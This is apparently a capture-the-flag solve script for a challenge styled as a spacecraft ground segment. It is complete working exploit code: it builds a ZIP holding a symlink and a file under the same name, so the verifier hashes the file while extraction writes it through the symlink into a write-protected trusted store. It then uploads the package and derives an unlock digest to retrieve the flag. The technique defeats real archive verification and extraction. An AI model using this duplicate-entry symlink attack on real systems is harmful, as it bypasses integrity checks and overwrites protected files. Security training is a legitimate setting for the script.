#!/usr/bin/env python3
"""ORRIN-3 / Apogee ground segment -- restore the validated manoeuvre table
via the same ZIP duplicate-name + symlink trick Greywater used.

The verifier resolves a manifest member to ONE archive entry by name (last-wins)
and hashes it; extract-zip honours unix symlinks and extracts entries in order.
Put two entries with the SAME name in the archive:
  (1) a symlink -> ../../../trusted/nav/orrin3-mvr.tbl   (escapes staging)
  (2) a file carrying the validated rev-47 bytes          (what the verifier hashes)
The verifier validates the file; extraction creates the symlink then writes the
file THROUGH it into the write-protected trusted store. Then satisfy the receipt
unlock = sha256("apogee|<spacecraft>|<validated_sha>|<pkg_id>").

stdlib only. Usage: python solve.py http://HOST:PORT
"""
import hashlib
import io
import json
import os
import sys
import urllib.error
import urllib.request
import zipfile

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w01.ctf.chronos-security.ro:37257").rstrip("/")
# Per-instance parameters (member name, symlink target, table id, spacecraft) are
# reconstructed from the journal's accepted delivery -- the same record the writeup
# uses to recover Greywater's attack. Defaults match the w01 case documented below.
NAME = "tables/orrin3-mvr.tbl"
TARGET = b"../../../trusted/nav/orrin3-mvr.tbl"     # staging/<id>/tables/ -> /tmp/apogee/trusted/nav/...
SPACECRAFT = "ORRIN-3"
TABLE = "orrin3-mvr.tbl"
PKG_ID = "RESTORE-REV47"


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=15) as r:
        return r.read()


def discover():
    """Reconstruct the hostile delivery from the journal: find the accepted entry
    whose extraction created a symlink resolving into the write-protected trusted
    store, and reuse that member name + symlink target + table id to replay it."""
    global NAME, TARGET, TABLE, SPACECRAFT
    entries = json.loads(get("/journal")).get("entries", [])
    for rec in entries:
        if rec.get("verdict") != "accepted":
            continue
        links = (rec.get("extraction") or {}).get("links") or {}
        for member, link in links.items():
            if "/trusted/" in (link.get("resolved") or ""):
                NAME = member
                TARGET = link["target"].encode()
                TABLE = rec.get("table", TABLE)
                SPACECRAFT = rec.get("spacecraft", SPACECRAFT)
                print("[*] journal replay: name=%s target=%s table=%s" % (NAME, TARGET.decode(), TABLE))
                return


def build_zip(validated):
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED)
    # entry 1: symlink (same name), created first by the extractor
    zi = zipfile.ZipInfo(NAME); zi.create_system = 3; zi.external_attr = (0o120777) << 16
    z.writestr(zi, TARGET)
    # entry 2: file with the validated bytes (last-wins for the verifier)
    zf = zipfile.ZipInfo(NAME); zf.create_system = 3; zf.external_attr = (0o100644) << 16
    z.writestr(zf, validated)
    z.close()
    return buf.getvalue()


def multipart(manifest_bytes, pkg_bytes):
    bnd = "----apogee%d" % os.getpid()
    def part(name, fn, ctype, data):
        h = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n' % (bnd, name, fn)
        h += "Content-Type: %s\r\n\r\n" % ctype
        return h.encode() + data + b"\r\n"
    body = (part("manifest", "manifest.json", "application/json", manifest_bytes)
            + part("package", "package.zip", "application/zip", pkg_bytes)
            + ("--%s--\r\n" % bnd).encode())
    return body, "multipart/form-data; boundary=" + bnd


def main():
    discover()
    validated = get("/reference/validated")
    vsha = hashlib.sha256(validated).hexdigest()
    print("[*] validated rev-47 sha256=%s size=%d" % (vsha, len(validated)))

    pkg = build_zip(validated)
    manifest = {
        "accreditation": "NSOC-ACR-RESTORE",
        "created": "2026-11-07T09:42:00Z",
        "members": [{"path": NAME, "size": len(validated), "sha256": vsha, "type": "file"}],
        "package_id": PKG_ID, "spacecraft": SPACECRAFT, "table": TABLE, "vendor": "NSOC Analyst Desk",
    }
    body, ctype = multipart(json.dumps(manifest).encode(), pkg)
    req = urllib.request.Request(BASE + "/api/v1/submissions", data=body, method="POST",
                                 headers={"Content-Type": ctype})
    try:
        resp = urllib.request.urlopen(req, timeout=20).read()
    except urllib.error.HTTPError as e:
        resp = e.read()
    print("[*] submission:", resp.decode(errors="replace")[:400])

    trusted = json.loads(get("/api/v1/status"))["trusted"]["sha256"]
    print("[*] trusted sha256 now:", trusted, "(== validated)" if trusted == vsha else "(MISMATCH)")

    digest = hashlib.sha256(("apogee|%s|%s|%s" % (SPACECRAFT, vsha, PKG_ID)).encode()).hexdigest()
    receipt = json.loads(get("/api/v1/pass/receipt?unlock=" + digest))
    print("[*] receipt status:", receipt.get("status"))
    token = receipt.get("release_token", "")
    if "CSCTF{" in token:
        print("\n[+] FLAG:", token)
    else:
        print(json.dumps(receipt, indent=2)[:600])


if __name__ == "__main__":
    main()
